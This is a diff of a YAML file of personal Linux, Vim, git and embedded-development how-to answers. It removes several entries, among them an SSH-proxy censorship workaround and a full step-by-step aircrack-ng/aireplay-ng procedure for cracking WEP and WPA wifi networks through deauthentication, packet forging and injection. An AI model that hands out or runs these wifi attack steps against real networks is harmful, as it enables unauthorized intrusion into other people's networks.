@@ -13,16 +13,6 @@
   - xbacklight -set 40
 
 - que:
-  - how to over the wall by firefox
-  - how to over the wall with firefox
-  ans: |
-   - sudo apt install openssh-server
-   - Install Firefox plugin "autoproxy", the option is: "default proxy: ssh -D"
-   - Goto http://www.cjb.net/cgi-bin/shell.cgi?action=signup to register a ssh account
-   - ssh -v -CD 7070 username@216.194.70.6 "select yes if ask"
-   - Click the "Fu" button to Green and start!
-
-- que:
   - linux chinese garbled
   ans:
   - iconv -f gb2312 -t utf-8 xxx.txt> xxx.tzt
@@ -66,7 +56,6 @@
   - how to unzip
   - how to untar
   - how to uncompress
-  - how to uncompress gz
   ans: |
    - tar xf
    - unrar e *.rar
@@ -341,25 +330,6 @@
   - sudo apt install libevent-dev
 
 - que:
-  - how to generate code documentation
-  ans: |
-   - Doxygen is a document generation tool: sudo apt install doxygen
-   - In the code directory run doxygen -g generate Doxyfile profile
-   - Doxypypy is a python tool used to make doxygen better identify
-   - git clone https://github.com/Feneric/doxypypy.git
-   - ./setup.py build
-   - sudo ./setup.py install
-   - In /usr/local/bin directory py_filter create a script
-    #!/bin/bash
-    python -m doxypypy.doxypypy -a -c $1
-   - Modify Doxyfile the FILTER_PATTERNS parameters like that: FILTER_PATTERNS *.py=py_filter
-   - Graphviz is a function-graph generation tools
-   - sudo apt install graphviz
-   - Set the Doxyfile variable to YES: CLASS_DIAGRAMS, HAVE_DOT, CALL_GRAPH, CALLER_GRAPH, DOT_PATH
-   - At last, run doxygen command to generate the diagram containing python code documentation
-   - Notes: If the contents of the document was incomplete, please see Doxyfile the EXTRACT_ prefix argument, or set EXTRACT_ALL to YES.
-
-- que:
   - how to calibrate touch screen
   ans: |
    - This operation must be under the X-window environment
@@ -494,29 +464,6 @@
   - ssh-add yourkey "Not the .pub"
 
 - que:
-  - how to upload the source code to github
-  ans: |
-   - Create SSH key: ssh-keygen -C your_email_address -f ~/.ssh/id_rsa
-   - Copy the SSH key to the GitHub account, as follows:
-     After logging GitHub, click the button in the top right corner of the page gear set, enter account settings.
-     Select SSH keys, the contents of id_rsa.pub file just copied verbatim into the generated.
-   - ssh -T git @ github.com, if successful connection, the key has been successfully imported
-   - Set git initial variables,
-   - git config --global user.name your_name
-   - git config --global user.email your_email_address
-   - Create a new repository on GitHub
-   - Enter the local source folder, proceed as follows,
-     git init
-     git add *
-     git commit -m "first commit"
-     git remote add origin https://github.com/your_user_name/your_repo_name.git
-     git push -u origin master
-   - After that, you only need to enter,
-     git add *
-     git commit
-     git push
-
-- que:
   - how to modify git editor
   - how to change git editor
   ans:
@@ -554,7 +501,6 @@
   - When Vim start, it will automatically execute the plugin folder, next it will execute the ftplugin(file type plugin) folder, autoload folder is used to store big *.vim files, only execute when function calls, it is used to make vim launch faster.
 
 - que:
-  - vim plug-in programming
   - how to make vim plug-in
   ans: |
    - First, in /etc/vimrc, "filetype plugin on" should be opened
@@ -628,23 +574,6 @@
   - Just type <br>
 
 - que:
-  - how to install vimwiki
-  ans: |
-   - Download vimwiki-xxxx.vba from http://www.vim.org/scripts/script.php?script_id=2226
-   - Open vimwiki-xxxx.vba with vim
-   - Use command so% to install it
-   - Edit/etc/vim/vimrc, add this:
-    " Vimwiki
-    let g: vimwiki_camel_case 0
-    let g: vimwiki_list [{
-    \ 'Path': '~/vimwiki/wiki',
-    \ 'Path_html': '~/vimwiki/html /',
-    \}]
-    set nocompatible
-    filetype plugin on
-    map <F5>: VimwikiAll2HTML <cr>
-
-- que:
   - vim how to read binary file
   ans: |
    - vi -b filename
@@ -690,45 +619,11 @@
    - sudo ifconfig eth0 up
 
 - que:
-  - how to hack the wifi
-  - how to hack wifi
-  ans: |
-   - 1. Init
-   - First, turn on the wireless card, sudo ifconfig wlan0 up
-   - Open the card listening mode, the number 6 is the AP's working channel, sudo airmon-ng start wlan0 6
-   - Begin to crawl CAP packages, sudo airodump-ng -w filename -c 6 mon0
-   - 2. Attack
-   - First, use the conflict attack to active the target, sudo aireplay-ng -0 10 -e <ESSID> -a <AP's MAC> -h <NETCARD's MAC> mon0 (10 represents the count number of transmissions), After use airodump-ng you can see the package number increase quickly. You can active the target again and again to accelerate the package catching.
-   - Second, connect the camouflage client: sudo aireplay-ng -1 0 -e <ESSID> -a <AP's MAC> -h <NETCARD's MAC> mon0 (0 is for delay)
-   - Third, use fragmented packets attack to obtain PRGA: sudo aireplay-ng -5 -b <AP's MAC> -h <NETCARD's MAC> mon0 (it will create a .xor file at last)
-   - Fourth, generate an ARP package according to the .xor file: packetforge-ng -0 -a AP's MAC -h NETCARD's MAC 5 -k 255.255.255.255 -l 255.255.255.255 -y XXXX.xor -w myarp
-   - Finally, injected the ARP package to start attack: aireplay-ng -2 -r myarp -x 512 mon0 (512 is the max speed value)
-   - 3. Crack
-   - Crack WEP data: aircrack-ng -z -b <AP's MAC> filename *.cap
-   - Crack WPA data: aircrack-ng -w password.txt -b <AP's MAC> filename *.cap
-
-- que:
   - how to deal with jlink unknow device
   - jlink unknow device
   ans: |
    - Short connect the Erase pin and the TST pin longer.
    - It is less relationship to the order of short connection.
-
-- que:
-  - how to install jlink on linux
-  ans: |
-   - Warning, because of the Jlink driver auto upgradation, you must choose an old version to install, otherwise the Jlink will be broken, and you will have to reinstall the ROM!
-   - First, check if the "libusb" and "libreadline" have been installed yet.
-   - sudo cp -d libjlinkarm.so. */usr/lib
-   - ldconfig
-   - sudo cp 45-jlink.rules /etc/udev/rules.d/
-   - Make sure that you are the member of group "plugdev".
-   - Reboot the computer.
-   - Run the file "start".
-   - If there's an error like  _error libreadline.so.5 can not open shared object file_, try this,
-   - Install the getlibs, sudo dpkg -i --force-all getlibs-all.deb
-   - Use getlibs to install the readline library, getlibs libreadline.so.5
-   - At last, make a link of libreadline.so.5 to into/lib
 
 - que:
   - how to install sdcc on ubuntu
@@ -1176,34 +1071,13 @@
   - Target -> Use MicroLIB must be selected.
 
 - que:
-  - how to build stm32 project
-  - how to build a stm32 project
-  - how to build stm32 mdk project
-  ans: |
-   - 1. Create 5 folders for the code files,
-     - Libraries (CMSIS STM32F10x_StdPeriph_Driver)
-     - List (listing files)
-     - Obj (output files)
-     - Project (* .uvproj files)
-     - User (main.c)
-   - 2. Open the MDK, create 4 groups,
-     - Startup (startup files)
-     - CMSIS (core_cm3.c, system_stm32f2xx.c)
-     - User (main.c)
-     - StdPeriph_Driver (stm32f2xx_gpio.c, stm32f2xx_rcc.c, and so on)
-   - 3. Options for Target,
-     - Output
-     - Listing
-     - C/C++ -> Include Paths (to include the header file path); Define (add USE_STDPERIPH_DRIVER, STM32F2XX_CL)
-
-- que:
   - how to install gstc-isp on ubuntu
   ans: |
    - When I run ./configure, there're some errors, so I did,
-   - sudo apt-get install gnome-core-devel
-   - sudo apt-get install gawk
+   - sudo apt install gnome-core-devel
+   - sudo apt install gawk
    - When make, there are errors, too. So I did,
-   - sudo apt-get install libvte-dev
+   - sudo apt install libvte-dev
    - Then edit src/main.c, alter the line to _#include <vte-0.0/vte/vte.h>_
 
 - que:
